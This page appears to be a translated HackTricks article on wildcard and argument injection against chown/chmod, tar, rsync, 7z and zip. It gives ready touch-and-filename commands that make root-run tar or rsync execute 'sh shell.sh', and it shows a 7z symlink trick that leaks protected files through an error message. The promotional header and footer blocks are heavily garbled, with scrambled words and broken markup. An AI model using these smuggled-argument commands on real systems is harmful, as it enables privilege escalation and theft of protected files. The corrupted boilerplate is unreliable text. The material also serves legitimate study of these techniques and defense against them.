{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Leer & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Kontroleer die [**subsrippangithub.cm/sorsarlosp!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Deel truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


## chown, chmod

Jy kan **aangee watter lêer eienaar en toestemmings jy wil kopieer vir die res van die lêers**
```bash
touch "--reference=/my/own/path/filename"
```
You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(gecombineerde aanval)_\
More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Voer arbitrêre opdragte uit:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar aanval)_\
More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Voer arbitrêre opdragte uit:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _aanval)_\
More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

In **7z** selfs met `--` voor `*` (let daarop dat `--` beteken dat die volgende invoer nie as parameters behandel kan word nie, so net lêerpaaie in hierdie geval) kan jy 'n arbitrêre fout veroorsaak om 'n lêer te lees, so as 'n opdrag soos die volgende deur root uitgevoer word:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
En jy kan lêers in die gids skep waar dit uitgevoer word, jy kan die lêer `@root.txt` en die lêer `root.txt` skep wat 'n **symlink** na die lêer is wat jy wil lees:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Dan, wanneer **7z** uitgevoer word, sal dit `root.txt` behandel as 'n lêer wat die lys van lêers bevat wat dit moet saamgeperste (dit is wat die bestaan van `@root.txt` aandui) en wanneer dit `root.txt` lees, sal dit `/file/you/want/to/read` lees en **aangesien die inhoud van hierdie lêer nie 'n lys van lêers is nie, sal dit 'n fout gooi** wat die inhoud wys.

_Meer inligting in Write-ups van die boks CTF van HackTheBox._

## Zip

**Voer arbitrêre opdragte uit:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
```markdown
{% hnt stye="acceas" %}
AWS Ha& praktyk ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Opleiding AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Leer & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Kontroleer die [**subsrippangithub.cm/sorsarlosp!
* Kontroleer die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Sluit aan 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
```
